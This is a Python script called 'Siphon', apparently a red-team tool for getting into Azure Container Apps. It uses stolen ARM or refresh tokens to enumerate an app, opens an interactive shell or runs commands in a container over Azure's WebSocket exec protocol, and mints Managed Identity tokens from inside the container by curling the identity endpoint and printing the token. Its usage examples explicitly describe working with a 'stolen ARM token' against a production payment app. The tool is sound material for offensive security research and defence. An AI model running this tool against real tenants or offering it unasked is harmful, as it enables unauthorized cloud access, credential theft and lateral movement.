#!/usr/bin/env python3
"""
Siphon - Azure Container App Exec Client

A standalone alternative to 'az containerapp exec'. 
Speaks Azure's WebSocket protocol directly using raw ARM tokens.
No az login. No CLI install. Just a token and a script.

Author : Rishabh Gupta
Blog   : https://adversly.com
"""

import requests
import json
import sys
import argparse
import threading
import base64
import time
import os

try:
    import websocket
except ImportError:
    print("\n  websocket-client is required but not installed.")
    print("  Install it with: pip3 install websocket-client\n")
    sys.exit(1)


# ============================================================
#  Colors & Output Helpers
# ============================================================

class Colors:
    """ANSI color codes — auto-disabled if output is not a terminal."""
    _enabled = hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

    RED     = "\033[91m" if _enabled else ""
    GREEN   = "\033[92m" if _enabled else ""
    YELLOW  = "\033[93m" if _enabled else ""
    BLUE    = "\033[94m" if _enabled else ""
    CYAN    = "\033[96m" if _enabled else ""
    GRAY    = "\033[90m" if _enabled else ""
    BOLD    = "\033[1m"  if _enabled else ""
    DIM     = "\033[2m"  if _enabled else ""
    RESET   = "\033[0m"  if _enabled else ""


C = Colors()


def banner():
    """Print the Siphon banner."""
    print(f"""
{C.RED}   _____ _       __                
  / ___/(_)___  / /_  ____  ____  
  \\__ \\/ / __ \\/ __ \\/ __ \\/ __ \\ 
 ___/ / / /_/ / / / / /_/ / / / / 
/____/_/ .___/_/ /_/\\____/_/ /_/  
      /_/                          {C.RESET}
{C.DIM}  Azure Container App Exec Client
  When az containerapp exec isn't an option{C.RESET}
{C.GRAY}  ─────────────────────────────────────────{C.RESET}
""")


def log_info(msg):
    print(f"  {C.BLUE}[*]{C.RESET} {msg}")

def log_success(msg):
    print(f"  {C.GREEN}[+]{C.RESET} {msg}")

def log_warn(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def log_error(msg):
    print(f"  {C.RED}[-]{C.RESET} {msg}")

def detail(label, value, color=""):
    print(f"      {C.GRAY}{label}:{C.RESET} {color}{value}{C.RESET}")

def separator():
    print(f"  {C.GRAY}{'─' * 50}{C.RESET}")


# ============================================================
#  Token Acquisition
# ============================================================

def get_arm_token_from_refresh(refresh_token, tenant="common", client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"):
    """Exchange a refresh token for an ARM access token via Entra ID."""
    log_info("Exchanging refresh token for ARM token...")

    try:
        r = requests.post(
            f"https://login.microsoftonline.com/{tenant}/oauth2/token",
            data={
                "grant_type": "refresh_token",
                "client_id": client_id,
                "resource": "https://management.azure.com",
                "refresh_token": refresh_token,
            },
            timeout=15
        )
        result = r.json()

        if "access_token" in result:
            log_success("ARM token obtained via refresh token exchange")
            return result["access_token"]

        log_error(f"Token exchange failed: {result.get('error_description', 'Unknown error')[:200]}")
    except requests.exceptions.Timeout:
        log_error("Token exchange timed out")
    except requests.exceptions.RequestException as e:
        log_error(f"Token exchange request failed: {e}")

    return None


# ============================================================
#  Container App Enumeration
# ============================================================

def build_resource_id(sub, rg, app):
    """Build the full ARM resource ID from individual components."""
    return f"/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.App/containerApps/{app}"


def get_container_info(arm_token, resource_id):
    """Enumerate container app details: revision, replica, container name, exec endpoint."""
    headers = {"Authorization": f"Bearer {arm_token}"}
    base_url = f"https://management.azure.com{resource_id}"
    api = "api-version=2025-01-01"
    app_name = resource_id.split("/")[-1]

    # ── Fetch app details ──
    log_info(f"Enumerating container app: {C.BOLD}{app_name}{C.RESET}")

    try:
        r = requests.get(f"{base_url}?{api}", headers=headers, timeout=15)
    except requests.exceptions.RequestException as e:
        log_error(f"Failed to reach ARM API: {e}")
        return None

    if r.status_code == 401:
        log_error("ARM token is invalid or expired")
        return None
    elif r.status_code == 403:
        log_error("Insufficient permissions on this Container App (need Contributor or higher)")
        return None
    elif r.status_code == 404:
        log_error("Container App not found — check subscription, resource group, and app name")
        return None
    elif r.status_code != 200:
        log_error(f"ARM API returned {r.status_code}: {r.text[:300]}")
        return None

    app_data = r.json()
    props = app_data["properties"]

    revision = props["latestRevisionName"]
    container_name = props["template"]["containers"][0]["name"]
    location = app_data["location"].replace(" ", "").lower()
    provisioning = props.get("provisioningState", "Unknown")

    identity = app_data.get("identity", {})
    mi_principal = identity.get("principalId", "")
    mi_type = identity.get("type", "")

    separator()
    detail("App", app_name, C.BOLD)
    detail("Location", location)
    detail("Revision", revision)
    detail("Container", container_name)
    detail("State", provisioning, C.GREEN if provisioning == "Succeeded" else C.YELLOW)

    if mi_principal:
        detail("Managed Identity", f"{mi_type}", C.CYAN)
        detail("MI Principal", mi_principal, C.CYAN)
    else:
        detail("Managed Identity", "None", C.GRAY)

    # ── Fetch replicas ──
    log_info("Getting replica info...")

    try:
        r = requests.get(f"{base_url}/revisions/{revision}/replicas?{api}", headers=headers, timeout=15)
    except requests.exceptions.RequestException as e:
        log_error(f"Failed to fetch replicas: {e}")
        return None

    if r.status_code != 200:
        log_error(f"Failed to get replicas: {r.status_code}")
        return None

    replicas = r.json().get("value", [])
    if not replicas:
        log_error("No running replicas found — is the app scaled to zero?")
        return None

    replica_name = replicas[0]["name"]

    # ── Find exec endpoint ──
    exec_endpoint = ""
    containers = replicas[0].get("properties", {}).get("containers", [])
    for c in containers:
        if c.get("name") == container_name:
            exec_endpoint = c.get("execEndpoint", "")
            break
    if not exec_endpoint and containers:
        exec_endpoint = containers[0].get("execEndpoint", "")

    detail("Replica", replica_name)
    detail("Exec Endpoint", "Found" if exec_endpoint else "Building from components",
           C.GREEN if exec_endpoint else C.YELLOW)
    separator()

    return {
        "revision": revision,
        "replica": replica_name,
        "container": container_name,
        "location": location,
        "resource_id": resource_id,
        "mi_principal": mi_principal,
        "exec_endpoint": exec_endpoint,
    }


def get_exec_token(arm_token, resource_id):
    """Request a data-plane auth token for the Container App exec endpoint."""
    log_info("Requesting exec auth token...")

    try:
        r = requests.post(
            f"https://management.azure.com{resource_id}/getAuthToken?api-version=2025-01-01",
            headers={"Authorization": f"Bearer {arm_token}", "Content-Length": "0"},
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        log_error(f"Failed to request exec token: {e}")
        return None

    if r.status_code != 200:
        log_error(f"Exec token request failed: {r.status_code} — {r.text[:300]}")
        return None

    data = r.json()["properties"]
    token = data["token"]
    expires = data["expires"]
    log_success(f"Exec token obtained {C.GRAY}(expires: {expires}){C.RESET}")
    return token


# ============================================================
#  WebSocket Protocol Helpers
# ============================================================

def build_ws_url(info, shell):
    """Build the WebSocket URL for the exec session."""
    if info.get("exec_endpoint"):
        return f"{info['exec_endpoint'].split('?')[0]}?command={shell}"

    path = info["resource_id"].replace("/subscriptions/", "subscriptions/")
    return (
        f"wss://{info['location']}.azurecontainerapps.dev/"
        f"{path}/revisions/{info['revision']}/"
        f"replicas/{info['replica']}/containers/{info['container']}/"
        f"exec?command={shell}"
    )


def write_to_socket(ws, text):
    """Simulate TTY keystrokes — send one character at a time over Channel 0 (stdin)."""
    for char in text:
        # Double-wrapped: Proxy:Data (0x00) + K8s:stdin (0x00) + char
        payload = b'\x00\x00' + char.encode("utf-8")
        ws.send(payload, opcode=websocket.ABNF.OPCODE_BINARY)
        time.sleep(0.01)


# ============================================================
#  Interactive Shell
# ============================================================

def interactive_shell(exec_token, info, shell="sh"):
    """Open an interactive WebSocket pseudo-terminal into the container."""
    url = build_ws_url(info, shell)

    info_msg = f"Opening {C.BOLD}{shell}{C.RESET} shell on {C.BOLD}{info['container']}{C.RESET}"
    log_info(info_msg)
    print()

    ws = websocket.WebSocket()
    try:
        ws.connect(
            url,
            header=[f"Authorization: Bearer {exec_token}"],
            origin=f"https://{info['location']}.azurecontainerapps.dev"
        )
    except Exception as e:
        log_error(f"WebSocket connection failed: {e}")
        return

    # Send terminal resize: Proxy:Data (0x00) + K8s:resize (0x04) + JSON
    ws.send(b'\x00\x04' + b'{"Width":120,"Height":30}', opcode=websocket.ABNF.OPCODE_BINARY)

    stop_event = threading.Event()

    def recv_loop():
        """Background thread: read frames and print output."""
        while not stop_event.is_set():
            try:
                data = ws.recv()
                if isinstance(data, bytes) and len(data) > 0:
                    channel = data[0]
                    text = ""
                    # Proxy banner (Channel 1, no K8s wrapping)
                    if channel == 1 and b"Connected" in data:
                        text = data[1:].decode("utf-8", errors="ignore")
                    # K8s stdout/stderr (Proxy:0x00 + K8s:0x01 or 0x02)
                    elif channel == 0 and len(data) > 1 and data[1] in (1, 2):
                        text = data[2:].decode("utf-8", errors="ignore")

                    if text:
                        sys.stdout.write(text)
                        sys.stdout.flush()
                elif isinstance(data, str) and data:
                    sys.stdout.write(data)
                    sys.stdout.flush()
            except websocket.WebSocketConnectionClosedException:
                if not stop_event.is_set():
                    print(f"\n  {C.YELLOW}[!]{C.RESET} Connection closed by server")
                stop_event.set()
                break
            except Exception:
                if not stop_event.is_set():
                    pass
                break

    recv_thread = threading.Thread(target=recv_loop, daemon=True)
    recv_thread.start()

    try:
        time.sleep(1.5)  # Wait for PTY to initialize
        while not stop_event.is_set():
            line = input()
            if stop_event.is_set():
                break
            try:
                # Double-wrapped stdin: Proxy:0x00 + K8s:0x00 + payload
                payload = b'\x00\x00' + (line + "\n").encode("utf-8")
                ws.send(payload, opcode=websocket.ABNF.OPCODE_BINARY)
            except Exception as e:
                log_warn(f"Send error: {e}")
                break
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {C.BLUE}[*]{C.RESET} Disconnecting...")
    finally:
        stop_event.set()
        try:
            ws.close()
        except Exception:
            pass

    print()


# ============================================================
#  Single Command Execution
# ============================================================

def run_command(exec_token, info, command):
    """Run a single command non-interactively via keystroke simulation."""
    url = build_ws_url(info, "sh")

    ws = websocket.WebSocket()
    ws.connect(
        url,
        header=[f"Authorization: Bearer {exec_token}"],
        origin=f"https://{info['location']}.azurecontainerapps.dev"
    )

    # Terminal resize
    ws.send(b'\x00\x04' + b'{"Width":120,"Height":30}', opcode=websocket.ABNF.OPCODE_BINARY)

    # Drain banners
    ws.settimeout(2.0)
    try:
        while True:
            data = ws.recv()
            if (isinstance(data, bytes) and b"Successfully connected" in data) or \
               (isinstance(data, str) and "Successfully connected" in data):
                break
    except websocket.WebSocketTimeoutException:
        pass

    # Use markers to cleanly extract output
    full_payload = f"echo '---START---'; {command}; echo '---END---'; exit\r"
    write_to_socket(ws, full_payload)

    output = ""
    ws.settimeout(8.0)
    try:
        while True:
            data = ws.recv()
            if isinstance(data, bytes) and len(data) > 0:
                channel = data[0]
                text = ""
                if channel == 0 and len(data) > 1 and data[1] in (1, 2):
                    text = data[2:].decode("utf-8", errors="ignore")
                elif channel in (1, 2):
                    text = data[1:].decode("utf-8", errors="ignore")
                output += text
            elif isinstance(data, str):
                output += data
    except (websocket.WebSocketTimeoutException, websocket.WebSocketConnectionClosedException):
        pass

    ws.close()

    # Extract clean output between markers
    if '---START---' in output and '---END---' in output:
        output = output.split('---START---')[-1].split('---END---')[0]
        return output.strip()

    # Fallback: strip echoed commands and prompts
    lines = output.split('\n')
    clean = [l.strip() for l in lines
             if command not in l and "exit" not in l
             and "START" not in l and "END" not in l
             and not l.strip().endswith('#')]
    return "\n".join(clean).strip()


# ============================================================
#  Managed Identity Token Minting
# ============================================================

def mint_mi_token(exec_token, info, resource):
    """Mint a Managed Identity token from inside the container."""
    info_msg = f"Minting MI token for {C.BOLD}{resource}{C.RESET}"
    log_info(info_msg)

    if not info.get("mi_principal"):
        log_warn("No Managed Identity detected on this Container App")
        log_warn("Attempting anyway — MI may be assigned at the environment level")
        print()

    # ACA injects IDENTITY_ENDPOINT and IDENTITY_HEADER as env vars
    cmd = (
        f'curl -s '
        f'-H "X-IDENTITY-HEADER: $IDENTITY_HEADER" '
        f'"$IDENTITY_ENDPOINT?resource={resource}&api-version=2019-08-01"'
    )

    output = run_command(exec_token, info, cmd)

    try:
        start = output.find('{"')
        if start < 0:
            log_error("No JSON found in response")
            detail("Raw output", output[:500])
            return None

        json_str = output[start:]
        end = json_str.rfind('}') + 1
        data = json.loads(json_str[:end])
        token = data.get("access_token", "")

        if not token:
            log_error("No access_token in response")
            detail("Raw output", output[:500])
            return None

        log_success(f"MI token obtained {C.GRAY}({len(token)} chars){C.RESET}")
        separator()

        # Decode JWT payload for useful context
        parts = token.split(".")
        if len(parts) >= 2:
            padded = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.b64decode(padded))
            detail("Resource", resource)
            detail("OID", payload.get("oid", "N/A"))
            detail("App ID", payload.get("appid", "N/A"))
            detail("Audience", payload.get("aud", "N/A"))
            exp = payload.get("exp")
            if exp:
                expiry = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(exp))
                detail("Expires", expiry)

        separator()
        print(f"\n  {C.GREEN}Token:{C.RESET}\n")
        print(f"  {token}\n")
        return token

    except json.JSONDecodeError as e:
        log_error(f"Failed to parse JSON: {e}")
        detail("Raw output", output[:500])
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        detail("Raw output", output[:500])

    return None


# ============================================================
#  Argument Parsing & Main
# ============================================================

def build_parser():
    """Build the argument parser with grouped options."""
    parser = argparse.ArgumentParser(
        description="Siphon — Azure Container App Exec Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.BOLD}examples:{C.RESET}
  {C.GRAY}# Interactive shell with a stolen ARM token{C.RESET}
  python3 siphon.py --token "$ARM_TOKEN" --sub "ceff06cb-..." --rg "prod-rg" --app "payment-prod"

  {C.GRAY}# Use bash instead of default sh{C.RESET}
  python3 siphon.py --token "$TOKEN" --sub "..." --rg "..." --app "..." --shell bash

  {C.GRAY}# Run a single command and exit{C.RESET}
  python3 siphon.py --token "$TOKEN" --sub "..." --rg "..." --app "..." --exec "id"

  {C.GRAY}# Mint a Managed Identity token for Microsoft Graph{C.RESET}
  python3 siphon.py --token "$TOKEN" --sub "..." --rg "..." --app "..." --mint-token https://graph.microsoft.com

  {C.GRAY}# Use a refresh token instead of ARM token{C.RESET}
  python3 siphon.py --refresh "$RT" --tenant "contoso.com" --sub "..." --rg "..." --app "..."

  {C.GRAY}# Just enumerate — don't connect{C.RESET}
  python3 siphon.py --token "$TOKEN" --sub "..." --rg "..." --app "..." --info-only

{C.BOLD}blog:{C.RESET}  https://adversly.com
""")

    # ── Authentication ──
    auth = parser.add_argument_group(f"{C.BOLD}authentication{C.RESET}")
    auth.add_argument("--token",
        help="ARM access token (use this when you already have a token)")
    auth.add_argument("--refresh",
        help="Refresh token (will be exchanged for an ARM token via Entra ID)")
    auth.add_argument("--tenant", default="common",
        help="Tenant ID or domain for refresh token exchange (default: common)")
    auth.add_argument("--client-id", default="d3590ed6-52b3-4102-aeff-aad2292ab01c",
        help="Client ID for refresh token exchange (default: Microsoft Office FOCI client)")

    # ── Target ──
    target = parser.add_argument_group(f"{C.BOLD}target{C.RESET}")
    target.add_argument("--resource-id",
        help="Full ARM resource ID of the Container App")
    target.add_argument("--sub",
        help="Subscription ID")
    target.add_argument("--rg",
        help="Resource group name")
    target.add_argument("--app",
        help="Container App name")

    # ── Actions ──
    actions = parser.add_argument_group(f"{C.BOLD}actions{C.RESET}")
    actions.add_argument("--shell", default="sh", metavar="SHELL",
        help="Shell binary to use: sh, bash, zsh, etc. (default: sh)")
    actions.add_argument("--exec", metavar="CMD",
        help="Run a single command non-interactively and exit")
    actions.add_argument("--mint-token", metavar="RESOURCE",
        help="Mint a Managed Identity token for the specified resource "
             "(e.g. https://graph.microsoft.com, https://management.azure.com)")
    actions.add_argument("--info-only", action="store_true",
        help="Only enumerate container info — don't connect or exec")

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    banner()

    # ── Resolve ARM token ──
    arm_token = args.token
    if not arm_token and args.refresh:
        arm_token = get_arm_token_from_refresh(args.refresh, args.tenant, args.client_id)
    if not arm_token:
        log_error("No token provided")
        print(f"      Use {C.BOLD}--token{C.RESET} with an ARM token or {C.BOLD}--refresh{C.RESET} with a refresh token\n")
        parser.print_help()
        sys.exit(1)

    # ── Resolve target ──
    resource_id = args.resource_id
    if not resource_id:
        if args.sub and args.rg and args.app:
            resource_id = build_resource_id(args.sub, args.rg, args.app)
        else:
            log_error("No target specified")
            print(f"      Use {C.BOLD}--resource-id{C.RESET} or {C.BOLD}--sub{C.RESET} + {C.BOLD}--rg{C.RESET} + {C.BOLD}--app{C.RESET}\n")
            parser.print_help()
            sys.exit(1)

    # ── Enumerate ──
    container_info = get_container_info(arm_token, resource_id)
    if not container_info:
        sys.exit(1)

    if args.info_only:
        log_success("Enumeration complete")
        sys.exit(0)

    # ── Get exec token ──
    exec_token = get_exec_token(arm_token, resource_id)
    if not exec_token:
        sys.exit(1)

    # ── Execute action ──
    if args.mint_token:
        mint_mi_token(exec_token, container_info, args.mint_token)

    elif args.exec:
        log_info(f"Executing: {C.BOLD}{args.exec}{C.RESET}")
        print()
        output = run_command(exec_token, container_info, args.exec)
        print(output)
        print()
        log_success("Command executed")

    else:
        interactive_shell(exec_token, container_info, args.shell)
        log_success("Session ended")


if __name__ == "__main__":
    main()
